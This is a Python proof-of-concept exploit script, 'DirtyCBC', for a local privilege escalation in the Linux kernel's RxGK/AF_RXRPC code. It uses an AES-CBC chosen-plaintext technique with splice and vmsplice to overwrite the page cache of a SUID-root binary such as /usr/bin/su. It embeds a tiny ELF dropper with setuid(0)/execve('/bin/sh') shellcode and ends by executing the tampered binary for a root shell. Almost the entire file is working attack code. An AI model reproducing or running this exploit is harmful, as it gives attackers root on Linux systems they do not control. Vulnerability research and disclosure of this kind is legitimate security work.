#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0
"""
DirtyCBC — Python PoC for Linux RxGK chosen-plaintext page-cache OOB-W

Mirror of poc.c.  Same exploit, same kernel call path, same chosen-
plaintext math.  Self-contained: Python 3.7+ stdlib + libcrypto.so
(OpenSSL — present by default on virtually every Linux install).  No
pip dependencies, no compiler required on target.

See writeup.md for the cryptographic technique (AES-CBC IV-XOR + RFC
3962 CTS-CS3 swap) and the kernel call path (RxGK token-decrypt
in-place AEAD over MSG_SPLICE_PAGES'd skb frags).

Usage:
    python3 poc.py                   # default target /usr/bin/su
    python3 poc.py /usr/bin/passwd   # any SUID-root, world-readable binary
"""

from __future__ import annotations

import ctypes
import ctypes.util
import errno
import fcntl
import os
import select
import socket
import struct
import sys
import time

# =====================================================================
# Constants from <linux/rxrpc.h> / <uapi/linux/socket.h> / linux/keys
# =====================================================================

AF_RXRPC = 33
SOL_RXRPC = 272
RXRPC_SECURITY_KEYRING = 2
RXRPC_USER_CALL_ID = 1
RXRPC_CHARGE_ACCEPT = 14

RXRPC_PACKET_TYPE_DATA = 1
RXRPC_PACKET_TYPE_ACK = 2
RXRPC_PACKET_TYPE_ABORT = 4
RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_PACKET_TYPE_RESPONSE = 7

RXRPC_CLIENT_INITIATED = 0x01
RXRPC_LAST_PACKET = 0x04

# x86_64 syscall numbers (works on every modern x86_64 Linux).
SYS_add_key = 248
SYS_keyctl = 250

KEY_SPEC_SESSION_KEYRING = -3
KEYCTL_JOIN_SESSION_KEYRING = 1
KEYCTL_SETPERM = 5

F_SETPIPE_SZ = 1031

# Server-side RxGK parameters under our control.
SRV_PORT = 7000
SVC_ID = 1234
KVNO = 1
ENCTYPE = 18         # aes256-cts-hmac-sha1-96
KEY_LEN = 32
KR_NAME = b"rxgk_poc_kr"

# RFC 3961 key-usage value the kernel passes to DK when deriving the
# server-side AEAD key.  Defined as RXGK_SERVER_ENC_TOKEN in
# net/rxrpc/rxgk_kdf.c.
RXGK_SERVER_ENC_TOKEN = 1036


def log(msg: str) -> None:
    print(f"[+] {msg}", file=sys.stderr)


def warn(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)


def die(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(1)


# =====================================================================
# libcrypto: AES-256 ECB single-block primitive via EVP.
# =====================================================================

def _load_libcrypto() -> ctypes.CDLL:
    for cand in ("libcrypto.so.3", "libcrypto.so.1.1", "libcrypto.so"):
        try:
            return ctypes.CDLL(cand, use_errno=True)
        except OSError:
            continue
    die("libcrypto.so not found; install openssl (apt-get install libssl3 or libssl1.1)")


_crypto = _load_libcrypto()

_crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
_crypto.EVP_CIPHER_CTX_new.argtypes = []

_crypto.EVP_CIPHER_CTX_free.restype = None
_crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]

_crypto.EVP_aes_256_ecb.restype = ctypes.c_void_p
_crypto.EVP_aes_256_ecb.argtypes = []

_crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
_crypto.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                        ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]

_crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
_crypto.EVP_DecryptInit_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                        ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]

_crypto.EVP_CIPHER_CTX_set_padding.restype = ctypes.c_int
_crypto.EVP_CIPHER_CTX_set_padding.argtypes = [ctypes.c_void_p, ctypes.c_int]

_crypto.EVP_EncryptUpdate.restype = ctypes.c_int
_crypto.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                       ctypes.POINTER(ctypes.c_int),
                                       ctypes.c_char_p, ctypes.c_int]

_crypto.EVP_DecryptUpdate.restype = ctypes.c_int
_crypto.EVP_DecryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                       ctypes.POINTER(ctypes.c_int),
                                       ctypes.c_char_p, ctypes.c_int]


def aes256_ecb(do_encrypt: bool, key: bytes, in_block: bytes) -> bytes:
    """AES-256-ECB single-block encrypt or decrypt.  Matches aes256_ecb() in poc.c."""
    assert len(key) == 32 and len(in_block) == 16
    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        die("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_ecb()
        if do_encrypt:
            _crypto.EVP_EncryptInit_ex(ctx, cipher, None, key, None)
        else:
            _crypto.EVP_DecryptInit_ex(ctx, cipher, None, key, None)
        _crypto.EVP_CIPHER_CTX_set_padding(ctx, 0)
        out = ctypes.create_string_buffer(16)
        outlen = ctypes.c_int(0)
        if do_encrypt:
            _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), in_block, 16)
        else:
            _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), in_block, 16)
        return out.raw[:16]
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


# =====================================================================
# RFC 3961 nfold + DK over AES-256.  Matches rfc3961_nfold() /
# rfc3961_DK_aes256() in poc.c.
# =====================================================================

def _gcd(a: int, b: int) -> int:
    while b:
        a, b = b, a % b
    return a


def _lcm(a: int, b: int) -> int:
    return a // _gcd(a, b) * b


def rfc3961_nfold(buf: bytes, outlen: int) -> bytes:
    """RFC 3961 §5.1 n-fold.  Maps arbitrary-length input to fixed-length
    output by overlapping rotations and binary addition."""
    inlen = len(buf)
    ulcm = _lcm(inlen, outlen)
    out = bytearray(outlen)
    byte = 0
    for i in range(ulcm - 1, -1, -1):
        msbit = (((inlen * 8) - 1)
                 + (((inlen * 8) + 13) * (i // inlen))
                 + ((inlen - (i % inlen)) * 8)) % (inlen * 8)
        byte += (((buf[((inlen - 1) - (msbit >> 3)) % inlen] << 8)
                  | buf[(inlen - (msbit >> 3)) % inlen])
                 >> ((msbit & 7) + 1)) & 0xff
        byte += out[i % outlen]
        out[i % outlen] = byte & 0xff
        byte >>= 8
    if byte:
        for i in range(outlen - 1, -1, -1):
            byte += out[i]
            out[i] = byte & 0xff
            byte >>= 8
    return bytes(out)


def rfc3961_DK_aes256(K: bytes, constant: bytes) -> bytes:
    """RFC 3961 DK for aes256-cts-hmac-sha1-96 (enctype 18):
        inblock = nfold(constant, 16)
        K1 = AES_ENC(K, inblock); K2 = AES_ENC(K, K1); DK = K1 || K2."""
    inblock = constant if len(constant) == 16 else rfc3961_nfold(constant, 16)
    k1 = aes256_ecb(True, K, inblock)
    k2 = aes256_ecb(True, K, k1)
    return k1 + k2


def compute_Ke(K: bytes) -> bytes:
    """Ke = DK(K, usage|0xAA) for usage = RXGK_SERVER_ENC_TOKEN.
    0xAA is the 'Ke' tag from RFC 3961 §5.3."""
    constant = bytes([
        0, 0,
        (RXGK_SERVER_ENC_TOKEN >> 8) & 0xff,
        RXGK_SERVER_ENC_TOKEN & 0xff,
        0xAA,
    ])
    return rfc3961_DK_aes256(K, constant)


# =====================================================================
# Self-contained 192-byte ELF dropper.  Identical byte-for-byte to
# TINY_ELF[] in poc.c — see writeup.md §"ELF dropper" for disassembly.
# =====================================================================

def build_tiny_elf() -> bytes:
    # ELF64 e_hdr (64 bytes)
    e_hdr = b"".join([
        b"\x7fELF\x02\x01\x01\x00",
        b"\x00" * 8,
        struct.pack("<H", 2),               # e_type = ET_EXEC
        struct.pack("<H", 0x3e),            # e_machine = EM_X86_64
        struct.pack("<I", 1),               # e_version
        struct.pack("<Q", 0x10000078),      # e_entry
        struct.pack("<Q", 64),              # e_phoff
        struct.pack("<Q", 0),               # e_shoff
        struct.pack("<I", 0),               # e_flags
        struct.pack("<H", 64),              # e_ehsize
        struct.pack("<H", 56),              # e_phentsize
        struct.pack("<H", 1),               # e_phnum
        struct.pack("<H", 0),               # e_shentsize
        struct.pack("<H", 0),               # e_shnum
        struct.pack("<H", 0),               # e_shstrndx
    ])
    assert len(e_hdr) == 64
    # Single PT_LOAD program header (56 bytes)
    phe = b"".join([
        struct.pack("<I", 1),               # p_type  = PT_LOAD
        struct.pack("<I", 5),               # p_flags = PF_R | PF_X
        struct.pack("<Q", 0),               # p_offset
        struct.pack("<Q", 0x10000000),      # p_vaddr
        struct.pack("<Q", 0x10000000),      # p_paddr
        struct.pack("<Q", 192),             # p_filesz
        struct.pack("<Q", 192),             # p_memsz
        struct.pack("<Q", 0x1000),          # p_align
    ])
    assert len(phe) == 56
    # Shellcode: setuid(0); execve("/bin/sh", NULL, NULL).  See poc.c
    # commentary for the "xor eax,eax before mov al,0x3b" rationale
    # (otherwise the kernel sees rax with garbage high bytes and
    # dispatches the x32 syscall path → SIGSEGV).
    sc = bytes.fromhex(
        "31ff"                          # xor edi, edi
        "b069"                          # mov al, 0x69       ; SYS_setuid
        "0f05"                          # syscall
        "48b8" "2f62696e2f736800"       # mov rax, "/bin/sh\0"
        "50"                            # push rax
        "4889e7"                        # mov rdi, rsp
        "31f6"                          # xor esi, esi       ; argv = NULL
        "31d2"                          # xor edx, edx       ; envp = NULL
        "31c0"                          # xor eax, eax       ; clear high bytes
        "b03b"                          # mov al, 0x3b       ; SYS_execve
        "0f05"                          # syscall
    )
    # Trap-fill (0xCC = int3) padding to 192 B total.
    pad = b"\xcc" * (192 - len(e_hdr) - len(phe) - len(sc))
    out = e_hdr + phe + sc + pad
    assert len(out) == 192
    return out


TINY_ELF = build_tiny_elf()


# =====================================================================
# Thin syscall + libc wrappers.
# =====================================================================

_libc = ctypes.CDLL("libc.so.6", use_errno=True)

_libc.syscall.restype = ctypes.c_long

# int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
_libc.bind.restype = ctypes.c_int
_libc.bind.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_uint]

# ssize_t vmsplice(int fd, const struct iovec *iov, unsigned long nr_segs, unsigned int flags)
_libc.vmsplice.restype = ctypes.c_long
_libc.vmsplice.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_uint]

# ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags)
_libc.splice.restype = ctypes.c_long
_libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
                          ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
                          ctypes.c_size_t, ctypes.c_uint]


class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p),
                ("iov_len", ctypes.c_size_t)]


def _make_iovec_array(buffers):
    """Build a contiguous (struct iovec[]) from a list of bytes/bytearray
    objects.  Returns (iov_array, keep_alive_refs)."""
    n = len(buffers)
    arr = (Iovec * n)()
    refs = []   # MUST keep references; pointers in iovec become dangling otherwise
    for i, buf in enumerate(buffers):
        if isinstance(buf, (bytes, bytearray)):
            cbuf = ctypes.c_char * len(buf)
            backing = cbuf.from_buffer_copy(buf) if isinstance(buf, bytes) \
                       else cbuf.from_buffer(buf)
        else:
            raise TypeError("buffers must be bytes/bytearray")
        refs.append(backing)
        arr[i].iov_base = ctypes.addressof(backing)
        arr[i].iov_len = len(buf)
    return arr, refs


def vmsplice_buffers(pipe_w_fd: int, buffers) -> int:
    """vmsplice() with a list of bytes/bytearray buffers.  Each becomes
    a separate pipe buffer = separate skb frag downstream."""
    arr, _refs = _make_iovec_array(buffers)
    n = _libc.vmsplice(pipe_w_fd, ctypes.byref(arr), len(arr), 0)
    if n < 0:
        raise OSError(ctypes.get_errno(), "vmsplice")
    return n


def splice_file(in_fd: int, in_off: int, out_fd: int, length: int) -> int:
    """splice(in_fd, &in_off, out_fd, NULL, length, 0)."""
    off = ctypes.c_longlong(in_off)
    n = _libc.splice(in_fd, ctypes.byref(off), out_fd, None, length, 0)
    if n < 0:
        raise OSError(ctypes.get_errno(), "splice in")
    return n


def splice_drain(in_fd: int, out_fd: int, length: int) -> int:
    """splice(in_fd, NULL, out_fd, NULL, length, 0)."""
    n = _libc.splice(in_fd, None, out_fd, None, length, 0)
    if n < 0:
        raise OSError(ctypes.get_errno(), "splice out")
    return n


def key_add(ktype: bytes, desc: bytes, payload, ringid: int) -> int:
    """SYS_add_key wrapper."""
    plen = 0 if payload is None else len(payload)
    pbuf = payload if payload is not None else b""
    n = _libc.syscall(ctypes.c_long(SYS_add_key),
                       ctypes.c_char_p(ktype),
                       ctypes.c_char_p(desc),
                       ctypes.c_char_p(pbuf),
                       ctypes.c_size_t(plen),
                       ctypes.c_int(ringid))
    if n < 0:
        raise OSError(ctypes.get_errno(), f"add_key({ktype!r}, {desc!r})")
    return n


def keyctl(op: int, *args) -> int:
    # Replace None with NULL via ctypes.c_void_p(0); leave ints alone.
    fixed = []
    for a in args:
        if a is None:
            fixed.append(ctypes.c_void_p(0))
        elif isinstance(a, int):
            fixed.append(ctypes.c_ulong(a))
        else:
            fixed.append(a)
    n = _libc.syscall(ctypes.c_long(SYS_keyctl), ctypes.c_ulong(op), *fixed)
    return n


# =====================================================================
# AF_RXRPC server side: keyring + socket + accept-pool charge.
# =====================================================================

SERVER_SECRET = None    # set in main(); 32 bytes
DERIVED_KE = None       # set in main(); 32 bytes


def setup_server_keyring(K: bytes) -> int:
    """Add a fresh keyring named KR_NAME containing the rxrpc_s server
    key.  Returns the keyring id."""
    kr = key_add(b"keyring", KR_NAME, None, KEY_SPEC_SESSION_KEYRING)
    desc = f"{SVC_ID}:6:{KVNO}:{ENCTYPE}".encode()
    k = key_add(b"rxrpc_s", desc, K, kr)
    keyctl(KEYCTL_SETPERM, kr, 0x3f3f3f3f)
    keyctl(KEYCTL_SETPERM, k, 0x3f3f3f3f)
    log(f"keyring {KR_NAME.decode()} id={kr}, rxrpc_s key id={k}")
    return kr


def open_rxrpc_server() -> socket.socket:
    """Open an AF_RXRPC server bound to 127.0.0.1:SRV_PORT, with
    SVC_ID and security keyring KR_NAME selected."""
    s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
    s.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEYRING, KR_NAME)
    # sockaddr_rxrpc layout (see <linux/rxrpc.h>):
    #   __kernel_sa_family_t srx_family;      // u16, AF_RXRPC
    #   __u16 srx_service;                    // u16, service id
    #   __u16 transport_type;                 // u16, SOCK_DGRAM
    #   __u16 transport_len;                  // u16, size of sockaddr_in
    #   union { struct sockaddr_in sin; ... } transport;
    sin = struct.pack("=H H 4s 8s",
                       socket.AF_INET,
                       socket.htons(SRV_PORT),
                       socket.inet_aton("127.0.0.1"),
                       b"\x00" * 8)
    assert len(sin) == 16
    srx = struct.pack("=H H H H",
                       AF_RXRPC,
                       SVC_ID,
                       socket.SOCK_DGRAM,
                       len(sin)) + sin
    rc = _libc.bind(s.fileno(), srx, len(srx))
    if rc != 0:
        die(f"rxrpc bind: {os.strerror(ctypes.get_errno())}")
    s.listen(8)
    log(f"AF_RXRPC server bound 127.0.0.1:{SRV_PORT} svc={SVC_ID}")
    return s


def charge_accept_pool(srv: socket.socket, n: int) -> None:
    """Prefill the AF_RXRPC server's prealloc backlog so the kernel
    will allocate incoming-call slots for our DATA packets."""
    for i in range(n):
        uid = 0x1000 + i
        ancdata = [
            (SOL_RXRPC, RXRPC_USER_CALL_ID, struct.pack("=Q", uid)),
            (SOL_RXRPC, RXRPC_CHARGE_ACCEPT, b""),
        ]
        try:
            srv.sendmsg([], ancdata, 0)
        except OSError as e:
            die(f"CHARGE_ACCEPT[{i}]: {e}")
    log(f"charged accept pool with {n} slots")


# =====================================================================
# Fake plain-UDP "client" side: hand-crafted CONNECT-DATA, RESPONSE.
# =====================================================================

def pack_rxrpc_hdr(epoch: int, cid: int, callN: int, seq: int, serial: int,
                    type_: int, flags: int, sec_idx: int, svc_id: int) -> bytes:
    """rxrpc_wire_header in network byte order (28 bytes).
    Layout: epoch, cid, callNumber, seq, serial (5×u32);
            type, flags, userStatus, securityIndex (4×u8);
            cksum, serviceId (2×u16).  Total 28."""
    return struct.pack("!IIIII BBBB HH",
                        epoch, cid, callN, seq, serial,
                        type_, flags, 0, sec_idx,  # userStatus=0
                        0, svc_id)                  # cksum=0


def open_fake_client() -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))    # ephemeral
    return s


def send_connect_data(udp: socket.socket, epoch: int, cid: int,
                       callN: int, serial: int) -> None:
    """Trigger the kernel to allocate a service connection + queue a
    CHALLENGE.  16 bytes of 0xAA payload satisfies the parser; only the
    wire header (sec_ix=6, LAST+CLIENT) matters here."""
    hdr = pack_rxrpc_hdr(epoch, cid, callN, 1, serial,
                          RXRPC_PACKET_TYPE_DATA,
                          RXRPC_CLIENT_INITIATED | RXRPC_LAST_PACKET,
                          6, SVC_ID)
    pkt = hdr + b"\xaa" * 16
    udp.sendto(pkt, ("127.0.0.1", SRV_PORT))


def recv_challenge(udp: socket.socket, timeout_s: float = 2.0):
    """Drain non-CHALLENGE packets until a CHALLENGE arrives or we time out."""
    for _ in range(8):
        ready, _, _ = select.select([udp], [], [], timeout_s)
        if not ready:
            return None, None
        data, src = udp.recvfrom(2048)
        if len(data) < 28:
            continue
        type_ = data[20]
        if type_ == RXRPC_PACKET_TYPE_CHALLENGE:
            return data, src
        if type_ == RXRPC_PACKET_TYPE_ABORT:
            return None, src
    return None, None


# =====================================================================
# The chosen-plaintext attack itself.
# =====================================================================

def do_chosen_plaintext_attack(target_path: str,
                                chosen_bytes: bytes,
                                target_off: int) -> None:
    """One batch: compute user_buf_i, send CONNECT-DATA → recv CHALLENGE →
    build malicious RESPONSE with interleaved (user_buf, target page)
    SGL, splice it out the UDP socket as MSG_SPLICE_PAGES'd skb frags."""
    chosen_len = len(chosen_bytes)
    if chosen_len % 16 != 0:
        die("chosen_len must be a multiple of 16")
    nblocks = chosen_len // 16
    if nblocks > 8:
        die("nblocks > 8 exceeds MAX_SKB_FRAGS budget")

    # Read the public target file's bytes at this batch's offset.
    tfd = os.open(target_path, os.O_RDONLY)
    target_blocks = os.pread(tfd, chosen_len, target_off)
    if len(target_blocks) != chosen_len:
        die(f"pread target: short read {len(target_blocks)}")

    # Compute user_buf_i so AEAD-decrypt produces chosen_i at the
    # target file's cache page in place.
    user_bufs = bytearray(16 * nblocks)
    for i in range(nblocks):
        target_i = target_blocks[16 * i: 16 * (i + 1)]
        chosen_i = chosen_bytes[16 * i: 16 * (i + 1)]
        if i < nblocks - 1:
            # CBC: P[2i+1] = AES_DEC(Ke, target_i) XOR user_buf_i
            #   ⇒ user_buf_i = AES_DEC(Ke, target_i) XOR chosen_i
            dec = aes256_ecb(False, DERIVED_KE, target_i)
            user_bufs[16 * i:16 * (i + 1)] = bytes(a ^ b for a, b in zip(dec, chosen_i))
        else:
            # RFC 3962 CS3 swap last block:
            #   P[2N-1] = AES_DEC(Ke, user_buf_(N-1)) XOR target_(N-1)
            #   ⇒ user_buf_(N-1) = AES_ENC(Ke, chosen XOR target)
            xor_in = bytes(a ^ b for a, b in zip(chosen_i, target_i))
            user_bufs[16 * i:16 * (i + 1)] = aes256_ecb(True, DERIVED_KE, xor_in)

    # CONNECT-DATA → CHALLENGE handshake.
    udp = open_fake_client()
    try:
        epoch = 0xDEADBEEF
        # Unique cid per batch so the server creates a fresh service connection.
        cid = 0x10000000 + ((target_off & 0xFFFFFFF) << 4)
        callN, serial = 1, 1
        send_connect_data(udp, epoch, cid, callN, serial)

        ch_pkt, src = recv_challenge(udp)
        if ch_pkt is None:
            die("no CHALLENGE")
        log("CHALLENGE received")
        ch_epoch, ch_cid = struct.unpack_from("!II", ch_pkt, 0)

        # Build the malicious RESPONSE wire header + framing.
        ticket_len = 32 * nblocks + 12
        token_len = 12 + ticket_len
        auth_len = 56

        rmal = pack_rxrpc_hdr(ch_epoch, ch_cid, 0, 0, serial + 1,
                               RXRPC_PACKET_TYPE_RESPONSE,
                               RXRPC_CLIENT_INITIATED,
                               6, SVC_ID)

        # hdr_pre = rxgk_response { start_time:be64, token_len:be32 }
        #         || RXGK_TokenContainer { kvno:be32, enctype:be32, ticket_len:be32 }
        hdr_pre = struct.pack("!Q I I I I",
                               0,             # start_time
                               token_len,
                               KVNO,
                               ENCTYPE,
                               ticket_len)
        assert len(hdr_pre) == 24

        # HMAC zone (12 bytes) — we don't forge a valid one.  The HMAC
        # mismatch aborts the connection but the in-place decrypt has
        # already happened.
        hmac_zone = b"\x00" * 12

        # hdr_post = auth_len (be32) + 56 B of arbitrary auth body
        hdr_post = struct.pack("!I", auth_len) + b"\xcc" * 56
        assert len(hdr_post) == 60

        # Pin the UDP socket to the kernel-chosen source so splice→sendmsg
        # uses the same flow.
        udp.connect(src)

        # Build the SGL via a pipe.  Each vmsplice (anon copy) and splice
        # (file page) becomes one pipe buffer → one skb fragment when we
        # splice pipe → UDP with MSG_SPLICE_PAGES.
        rfd, wfd = os.pipe()
        try:
            fcntl.fcntl(wfd, F_SETPIPE_SZ, 1 << 20)

            # Stage 1: wire header + hdr_pre as ONE pipe buffer.
            vmsplice_buffers(wfd, [rmal + hdr_pre])

            # Stage 2: interleave (user_buf_i, target page) for nblocks blocks.
            for i in range(nblocks):
                vmsplice_buffers(wfd, [bytes(user_bufs[16 * i:16 * (i + 1)])])
                splice_file(tfd, target_off + 16 * i, wfd, 16)

            # Stage 3: HMAC zone + hdr_post.
            vmsplice_buffers(wfd, [hmac_zone + hdr_post])

            total = len(rmal) + len(hdr_pre) + 32 * nblocks + 12 + len(hdr_post)
            sn = splice_drain(rfd, udp.fileno(), total)
            log(f"sent malicious RESPONSE {sn} B "
                f"(interleaved {nblocks}×32 + framing)")
        finally:
            os.close(rfd)
            os.close(wfd)
        time.sleep(0.2)   # let the rxrpc kworker process the RESPONSE
    finally:
        udp.close()
        os.close(tfd)


# =====================================================================
# Main flow.
# =====================================================================

def main(argv) -> int:
    global SERVER_SECRET, DERIVED_KE

    target = argv[1] if len(argv) > 1 else "/usr/bin/su"

    total_blocks = 12             # drop full 192-byte ELF
    blocks_per_batch = 6          # MAX_SKB_FRAGS=17 → 6 (user, target) pairs
    nbatches = (total_blocks + blocks_per_batch - 1) // blocks_per_batch

    # Touch an AF_RXRPC socket first to trigger autoload of the rxrpc
    # module via the net-pf-33 alias.  Without this, the subsequent
    # add_key("rxrpc_s", ...) returns -ENODEV on a fresh boot.
    try:
        probe = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
        probe.close()
    except OSError as e:
        warn(f"AF_RXRPC probe: {e} (continuing anyway)")

    # Join a fresh session keyring so add_key doesn't collide with prior runs.
    rc = keyctl(KEYCTL_JOIN_SESSION_KEYRING, None)
    if rc < 0:
        warn(f"keyctl_join_session: {os.strerror(ctypes.get_errno())}")

    # Pick a random K and derive Ke.
    SERVER_SECRET = os.urandom(KEY_LEN)
    DERIVED_KE = compute_Ke(SERVER_SECRET)

    # Plumb the AF_RXRPC server + prefill its accept pool.
    setup_server_keyring(SERVER_SECRET)
    srv = open_rxrpc_server()
    try:
        charge_accept_pool(srv, nbatches + 2)

        # Pre-warm the target's page cache.
        with open(target, "rb") as f:
            f.read(4096)
        log(f"pre-warmed page cache for {target}")

        # Drop the 192-byte ELF in nbatches RESPONSEs at consecutive 96-byte offsets.
        for b in range(nbatches):
            start_block = b * blocks_per_batch
            batch_blocks = min(blocks_per_batch, total_blocks - start_block)
            batch_chosen = TINY_ELF[16 * start_block: 16 * (start_block + batch_blocks)]
            batch_off = 16 * start_block
            log(f"=== batch {b + 1}/{nbatches}: {batch_blocks} blocks at offset {batch_off} ===")
            do_chosen_plaintext_attack(target, batch_chosen, batch_off)

        # Verify the in-place mutation reached the cache.
        chosen_len = 16 * total_blocks
        with open(target, "rb") as f:
            got = f.read(chosen_len)
        if got != TINY_ELF[:chosen_len]:
            log("cache content does not match expected ELF")
            log("got    : " + " ".join(f"{b:02x}" for b in got[:32]))
            log("expect : " + " ".join(f"{b:02x}" for b in TINY_ELF[:32]))
            return 1
        log(f"✓ {target} first {chosen_len} bytes are now our chosen plaintext")
        log(f"exec {target} — should give a root shell")
    finally:
        # Closing the AF_RXRPC server fd is delayed until after exec by
        # the OS — explicit close before exec is fine because srv isn't
        # FD_CLOEXEC-set and exec inherits no useful state from it.
        srv.close()

    os.execv(target, [target])
    warn(f"exec {target} failed")
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
